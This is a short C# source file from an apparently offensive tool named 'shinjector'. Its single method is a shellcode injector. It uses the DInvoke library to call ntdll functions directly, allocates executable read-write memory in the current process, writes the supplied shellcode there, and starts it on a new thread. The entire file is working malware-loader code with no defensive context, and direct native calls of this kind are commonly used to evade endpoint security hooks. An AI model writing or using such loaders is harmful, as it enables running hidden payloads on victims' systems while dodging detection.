using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

namespace shinjector.Casos
{
    public class NTDLL
    {
        public static void Inject(byte[] shellcode)
        {
            IntPtr baseA = IntPtr.Zero;
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, new IntPtr((long)shellcode.Length));

            IntPtr baseAddress = Native.NtAllocateVirtualMemory((IntPtr)(-1), ref baseA, IntPtr.Zero, ref lpValue, 0x00002000 | 0x00001000, 0x40);

            if (baseAddress == IntPtr.Zero)
                return;

            IntPtr buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
            uint r = Native.NtWriteVirtualMemory((IntPtr)(-1), baseAddress, buffer, (uint)shellcode.Length);

            IntPtr hthread = IntPtr.Zero;
            Native.NtCreateThreadEx(ref hthread,DInvoke.Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, (IntPtr)(-1), baseAddress, IntPtr.Zero, 
                                    false, 0, 0, 0, IntPtr.Zero);

        }
        
    }
}
